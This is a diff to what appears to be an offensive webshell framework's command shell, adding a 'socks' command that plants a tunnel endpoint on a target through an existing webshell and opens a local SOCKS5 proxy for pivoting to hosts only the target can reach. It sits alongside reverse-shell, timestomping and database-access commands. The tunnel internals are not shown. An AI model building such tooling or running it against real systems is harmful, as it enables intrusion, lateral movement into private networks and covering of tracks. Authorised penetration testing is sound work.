@@ -22,7 +22,7 @@ from . import log
 from .config import Config
 from .core.webshell import WebShell
 from .exceptions import WebshellError
-from .features import database, enum, files, inject, portscan, recon, revshell
+from .features import database, enum, files, inject, portscan, recon, revshell, tunnel
 from .session import Session
 from .utils.network import get_ip_address
 
@@ -361,6 +361,27 @@ class Repl(cmd2.Cmd):
         shell = str(line).strip() or "/bin/bash"
         log.raw(revshell.pty_upgrade_hints(shell))
 
+    def do_socks(self, line: cmd2.Statement) -> None:
+        """socks [port] — plant a tunnel endpoint and open a local SOCKS5 proxy.
+
+        Pivot through the first webshell: point curl/proxychains/a browser at the
+        local port to reach hosts only the target can see. Press Enter to stop.
+        """
+        port = int(str(line).strip() or self._ask("Local SOCKS port", "1080"))
+        ws = self.webshells[0]
+        try:
+            url = tunnel.plant(ws)
+        except WebshellError as exc:
+            log.error(f"socks: {exc}")
+            return
+        log.success(f"Tunnel endpoint planted: {url}")
+        server = tunnel.serve(url, local_port=port, config=self.config)
+        try:
+            input("SOCKS5 proxy running — press Enter to stop ...\n")
+        finally:
+            server.shutdown()
+            log.info("SOCKS5 proxy stopped.")
+
     def do_db(self, _: cmd2.Statement) -> None:
         """Open the database manager (MySQL or PostgreSQL) via the webshell."""
         engine = self._ask("Engine (mysql/pgsql)", "mysql")
@@ -585,7 +606,7 @@ with contextlib.suppress(Exception):
          Repl.do_mv, Repl.do_cp, Repl.do_mkdir, Repl.do_chmod, Repl.do_timestomp, Repl.do_edit],
         "Files",
     )
-    cmd2.categorize([Repl.do_ps, Repl.do_rsh, Repl.do_pty, Repl.do_db], "Pivot")
+    cmd2.categorize([Repl.do_ps, Repl.do_rsh, Repl.do_pty, Repl.do_socks, Repl.do_db], "Pivot")
     cmd2.categorize([Repl.do_aiw, Repl.do_aimw, Repl.do_fr], "Inject")
     cmd2.categorize(
         [Repl.do_shell, Repl.do_cd, Repl.do_pwd, Repl.do_exec, Repl.do_setl, Repl.do_setr],
